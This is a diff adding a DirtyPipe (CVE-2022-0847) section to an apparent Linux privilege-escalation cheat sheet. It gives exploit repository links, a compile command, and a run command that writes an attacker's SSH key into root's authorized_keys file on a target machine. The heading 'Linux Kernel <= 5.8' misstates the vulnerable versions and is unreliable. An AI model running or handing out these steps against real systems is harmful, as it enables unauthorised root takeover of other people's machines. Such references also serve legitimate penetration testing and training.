@@ -49,6 +49,22 @@ chmod u+x executablename
 ./executablename
 ```
 
+## DirtyPipe - Linux Kernel <= 5.8
+
+Download the exploit from the following repository [https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/compile.sh](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/compile.sh). Compile it:
+
+```bash
+gcc exploit.c -o dirtypipe
+```
+Transfer the exploit to the target machine and execute it.
+
+```
+./dirtypipe /root/.ssh/authorized_keys 1 $'\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo4ILTzBpODN8ubP+Qe3rhWgiPQqldRbCkkdcQb3vChet2SIVr3dM4Y5RQ11cYas1+bPT99nEuu++G7SiEN3juWhK3ymb9g+vC3DdACQbxsUhG4octS1K1N3D4grijfH9YfDoYW37VafhNE6PBa2mZu8KMBlTYRLOw1fP02ncZt0PFiYS0tD2lrKvr2nFBNDrJhRtHtMf6YUjlLEb7p2br/z4P40z0vNr2YpEDpTEorW6RTZ802DlinSMpCdkt\n'
+```
+* [https://dirtypipe.cm4all.com/](https://dirtypipe.cm4all.com/)
+* [https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit](https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit)
+
+
 ## eBPF\_verifier - Linux Kernel < 4.13.9
 
 ```bash
